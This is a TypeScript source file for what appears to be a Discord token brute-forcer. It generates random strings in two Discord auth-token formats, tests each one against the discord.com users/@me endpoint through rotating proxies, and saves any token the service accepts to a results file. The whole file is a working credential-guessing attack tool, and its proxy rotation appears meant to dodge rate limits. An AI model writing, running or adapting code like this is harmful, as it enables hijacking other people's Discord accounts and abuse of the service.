import { join } from "path";
import request from "request";
import { FileHandler } from "../utils/file_handler";
import { Logger } from "../utils/logger";
import { OptionsType } from "../utils/preview";
import { ProxiesHandler } from "../utils/proxies_handler";

interface ToolManagerType {
  proxieshandler: ProxiesHandler;
  options: OptionsType;
}

export const ToolStartManager = ({ options, proxieshandler }: ToolManagerType): void => {
  const started_stamp: number = Date.now();
  let proxy: string, token: string, ipr: number;
  let i: number = (ipr = 0x0);

  const requestLoop = setInterval(() => {
    try {
      if (options.max_checks && options.max_checks <= i) {
        clearInterval(requestLoop);
        Logger.info(`Checking Done ${Date.now() - started_stamp}ms`);
        return;
      }
      token = g_token(Math.random() >= 0.5 ? 0x2 : 0x1);
      proxy =
        proxieshandler.proxies[ipr >= proxieshandler.proxies.length - 0x1 ? (ipr = 0x0) : ipr];

      if (!proxy) {
        throw new Error(`[${proxy}] Invalid proxy line`);
      }

      const requestEdited =
        options.proxiesQs === "yes"
          ? request.defaults({
              proxy: `${options.protocol}://${proxy}`,
            })
          : request;

      requestEdited.get(
        `https://discord.com/api/v${options.version}/users/@me`,
        {
          headers: {
            "Content-type": "application/json",
            Authorization: token,
          },
        },
        (error, _response, body) => {
          try {
            if (error || !body) {
              throw new Error("Invalid token generated");
            }
            const l = JSON.parse(body);
            if (l.code !== 0x0) {
              Logger.info(`valid token [${token}]`);
              FileHandler.writeFile<string>(
                join(__dirname, `../../result/token-${Date.now()}.txt`),
                `token -> ${token}`,
              );
            } else throw new Error("Invalid token generated");
          } catch (e) {
            Logger.error(
              `Invalid token ${
                options.proxiesQs === "yes" ? `[\x1b[35m${proxy}\x1b[0m]` : ""
              }[${token.slice(0x0, 0x1e)}..]`,
            );
          }
        },
      );
      ipr++;
      i++;
    } catch (e) {
      Logger.error(String(e));
    }
  }, options.delay_time * 1e3);
};

export const g_token = (version_token = 0x1): string => {
  const gn = (_length: number, symbols = false) => {
    const characters: string =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz123456789" + (symbols ? "_-" : "");
    const p: string[] = [];
    for (let i = 0x0; i < _length; i++) {
      p.push(characters.charAt(~~(Math.random() * characters.length)));
    }
    return p.join("");
  };
  if (version_token === 0x2) {
    return `m${gn(0x2)}.${gn(0x54, true)}`;
  }
  return `ND${gn(0x16)}.${gn(0x6)}.${gn(0x1b, true)}`;
};
